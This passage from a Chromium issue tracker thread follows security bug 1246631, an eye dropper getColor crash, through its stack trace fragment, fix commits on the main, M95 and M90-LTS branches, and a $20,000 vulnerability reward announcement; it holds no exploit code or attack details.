0b 000000f5`4b3fd800 00007ffd`6ad63a1e     views!views::Widget::OnNativeWidgetPaint+0x41 [E:\v8\chromium\src\ui\views\widget\widget.cc @ 1479] 
0c 000000f5`4b3fd840 00007ffd`5d29d6b0     views!views::DesktopNativeWidgetAura::OnPaint+0x4e [E:\v8\chromium\src\ui\views\widget\desktop_aura\desktop_native_widget_aura.cc @ 1136] 
```

### io...@microsoft.com (2021-09-14)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-09-15)

Updating as Fixed, which is appears so based on CL + https://crbug.com/chromium/1246631#c11 and #15. Please re-open if this is incorrect. 
Once issues are fixed and you would like to request merges, but just update the issue as Fixed. This allows the bot to kick in with appropriate merge request labeling. For security bugs, once marked fixed, there is no need to manually update with merge requests. Thanks :) 

### [Deleted User] (2021-09-15)

Your change meets the bar and is auto-approved for M95. Please go ahead and merge the CL to branch 4638 (refs/branch-heads/4638) manually. Please contact milestone owner if you have questions.
Merge instructions: https://www.chromium.org/developers/how-tos/drover
Owners: benmason@(Android), harrysouders@(iOS), None@(ChromeOS), pbommana@(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2021-09-15)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-09-15)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2e7c9b33453b999317c410730c8290ddf869648a

commit 2e7c9b33453b999317c410730c8290ddf869648a
Author: Ionel Popescu <iopopesc@microsoft.com>
Date: Wed Sep 15 18:16:16 2021

Speculative fix for eye dropper getColor crash.

There seems to be a situation where the captured frame coordinates
are different than the ones accessible by moving the mouse.

I am not able to locally reproduce this issue, so I am adding DCHECKs
to validate that the coordinates are correct and I am also handling
the invalid coordinates to prevent invalid memory access.

(cherry picked from commit a656373ae7212e0d88474bdec4691a4152452748)

Bug: 1246631
Change-Id: I915d46a71aa73b5dcf08127d347fdd47c1ddf54c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3152423
Reviewed-by: Mason Freed <masonf@chromium.org>
Commit-Queue: Ionel Popescu <iopopesc@microsoft.com>
Cr-Original-Commit-Position: refs/heads/main@{#920811}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3163070
Auto-Submit: Ionel Popescu <iopopesc@microsoft.com>
Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com>
Cr-Commit-Position: refs/branch-heads/4638@{#75}
Cr-Branched-From: 159257cab5585bc8421abf347984bb32fdfe9eb9-refs/heads/main@{#920003}

[modify] https://crrev.com/2e7c9b33453b999317c410730c8290ddf869648a/chrome/browser/ui/views/eye_dropper/eye_dropper_view.cc


### [Deleted User] (2021-09-16)

[Empty comment from Monorail migration]

### am...@google.com (2021-09-23)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2021-09-23)

Congratulations, the VRP Panel has decided to award you $20,000 for this report. Thank you for this report and nice work! 

### ma...@chromium.org (2021-09-23)

Wow $20k, not bad!

### am...@google.com (2021-09-24)

[Empty comment from Monorail migration]

### io...@microsoft.com (2021-10-06)

[Empty comment from Monorail migration]

### am...@chromium.org (2021-10-19)

[Empty comment from Monorail migration]

### am...@google.com (2021-10-19)

[Empty comment from Monorail migration]

### rz...@google.com (2021-10-21)

[Empty comment from Monorail migration]

### [Deleted User] (2021-10-21)

[Empty comment from Monorail migration]

### gi...@google.com (2021-10-25)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2021-10-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src/+/2674b3f6170ca4c3d60594cb70a4d2f57fe5b2d7

commit 2674b3f6170ca4c3d60594cb70a4d2f57fe5b2d7
Author: Ionel Popescu <iopopesc@microsoft.com>
Date: Wed Oct 27 08:18:46 2021

[M90-LTS] Speculative fix for eye dropper getColor crash.

There seems to be a situation where the captured frame coordinates
are different than the ones accessible by moving the mouse.

I am not able to locally reproduce this issue, so I am adding DCHECKs
to validate that the coordinates are correct and I am also handling
the invalid coordinates to prevent invalid memory access.

M90 merge issues:
  original_offset_x/y not present on M90

(cherry picked from commit a656373ae7212e0d88474bdec4691a4152452748)

Bug: 1246631
Change-Id: I915d46a71aa73b5dcf08127d347fdd47c1ddf54c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3152423
Commit-Queue: Ionel Popescu <iopopesc@microsoft.com>
Cr-Original-Commit-Position: refs/heads/main@{#920811}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/3234955
Reviewed-by: Michael Ershov <miersh@google.com>
Owners-Override: Michael Ershov <miersh@google.com>
Commit-Queue: Roger Felipe Zanoni da Silva <rzanoni@google.com>
Cr-Commit-Position: refs/branch-heads/4430@{#1650}
Cr-Branched-From: e5ce7dc4f7518237b3d9bb93cccca35d25216cbe-refs/heads/master@{#857950}

[modify] https://crrev.com/2674b3f6170ca4c3d60594cb70a4d2f57fe5b2d7/chrome/browser/ui/views/eye_dropper/eye_dropper_view.cc


### rz...@google.com (2021-10-27)

[Empty comment from Monorail migration]

### am...@google.com (2021-11-02)

[Empty comment from Monorail migration]

### pa...@chromium.org (2021-12-16)

[Empty comment from Monorail migration]

### [Deleted User] (2021-12-22)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1246631?no_tracker_redirect=1

[Monorail mergedwith: crbug.com/chromium/1255569]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40057168)*
